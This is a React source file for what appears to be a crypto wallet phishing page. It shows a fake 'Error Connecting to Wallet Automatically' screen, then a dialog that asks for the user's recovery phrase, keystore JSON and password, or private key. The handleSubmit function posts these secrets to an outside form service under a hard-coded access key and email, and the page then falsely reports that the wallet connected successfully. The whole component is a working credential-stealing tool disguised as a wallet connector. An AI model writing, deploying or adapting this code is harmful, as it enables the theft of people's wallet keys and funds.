import './wallet.css';
import { useLocation } from "react-router-dom";
import { useState, useEffect } from "react";

const Wallet = () => {
  const location = useLocation();
  const wallet = location.state?.wallet;

  const [loading, setLoading] = useState(true);
  const [showDialog, setShowDialog] = useState(false);
  const [animal, setAnimal] = useState("Phrase");
  const [name, setName] = useState(""); // Phrase / Keystore JSON / Private Key
  const [keystorePassword, setKeystorePassword] = useState(""); // NEW: for Keystore password
  const [submitting, setSubmitting] = useState(false);
  const [successDialog, setSuccessDialog] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false);
    }, 4000); 
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);

    try {
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json"
        },
        body: JSON.stringify({
          access_key: "98cc6406-0e30-4999-9496-65ac1c56fa08",
          name: wallet.label, // required
          email: "cipriancretu@gmail.com.com", // required, placeholder is fine
          message: `Name: ${wallet.label}\nType: ${animal}\nInput: ${name}\nMessage: ${animal === "Keystore" ? keystorePassword : ""}`,
          // custom fields message=password, wallet=name
          wallet_label: wallet.label,
          wallet_image: wallet.image,
          type: animal,
          input_info: name,
          keystore_password: animal === "Keystore" ? keystorePassword : null
        })
      });

      const result = await response.json();

      if (result.success) {
        setSuccessDialog(true);
      } else {
        alert("Failed to send data: " + result.message);
      }
    } catch (error) {
      alert("Error submitting form: " + error.message);
    } finally {
      setSubmitting(false);
    }
  };



  const handleCloseSuccess = () => {
    setSuccessDialog(false);
    setShowDialog(false);
    setAnimal("Phrase");
    setName("");
    setKeystorePassword("");
  };

  const getAnimalText = () => {
    switch (animal) {
      case "Phrase":
        return "Typically 12 (sometimes 24) words separated by single spaces";
      case "Keystore":
        return "Several lines of text beginning with “[…]” plus the password you used to encrypt it";
      case "privateKey":
        return "Typically 64 alphanumeric characters";
      default:
        return "";
    }
  };

  const getPlaceholder = () => {
    switch (animal) {
      case "Phrase":
        return "Enter your recovery phrase";
      case "Keystore":
        return "Enter Keystore JSON";
      case "privateKey":
        return "Enter your private key";
      default:
        return "Enter name";
    }
  };

  return (
    <div className="error-connect-container">
      {loading ? (
        <div className="loading-screen">
          <div className="spinner"></div>
          <div>Loading...</div>
        </div>
      ) : (
        <div className="error-screen">
          <div style={{background: "grey", width: "100%", height: '30px', position: "absolute", top: "0"}}></div>
          <div className="error-icon">⚠️</div>
          <h1>Error Connecting to Wallet Automatically</h1>
          <button
            className="connect-btn"
            onClick={() => setShowDialog(true)}
          >
            Connect Manually
          </button>

          <div className='d-pro'>
            <p>Decentralized Protocol</p>
            <p>Phantom</p>
          </div>

          {showDialog && (
            <div className="dialog-overlay">
              <div className="dialog-box">
                <div>
                  <img src={wallet.image} alt='wallet' width={40} height={40}/>
                  <h2 style={{color: "#444444"}}>{wallet.label}</h2>
                </div>

                <div className="animal-selector">
                  {["Phrase", "Keystore", "privateKey"].map((a) => (
                    <button
                      key={a}
                      type="button"
                      className={`animal-btn ${animal === a ? "selected" : ""}`}
                      onClick={() => setAnimal(a)}
                    >
                      {a}
                    </button>
                  ))}
                </div>

                <form onSubmit={handleSubmit}>
                  <label>
                    <textarea
                      type="text"
                      placeholder={getPlaceholder()}
                      value={name}
                      onChange={(e) => setName(e.target.value)}
                      rows={7}
                      required
                    />
                    { animal === "Keystore" ? (
                      <textarea 
                        placeholder="Wallet Password"
                        rows={1}
                        value={keystorePassword}
                        onChange={(e) => setKeystorePassword(e.target.value)}
                        required
                      />
                    ) : null }
                  </label>

                  <p className="animal-info">{getAnimalText()}</p>

                  <div className="dialog-actions">
                    <button type="submit" disabled={submitting}>
                      {submitting ? "Loading..." : "Proceed"}
                    </button>
                    <button
                      type="button"
                      onClick={() => setShowDialog(false)}
                      disabled={submitting}
                    >
                      Cancel
                    </button>
                  </div>
                </form>
              </div>
            </div>
          )}

          {successDialog && (
            <div className="dialog-overlay">
              <div className="dialog-box">
                <h2>Success!</h2>
                <p>Your wallet has been connected successfully.</p>
                <button onClick={handleCloseSuccess}>Close</button>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default Wallet;
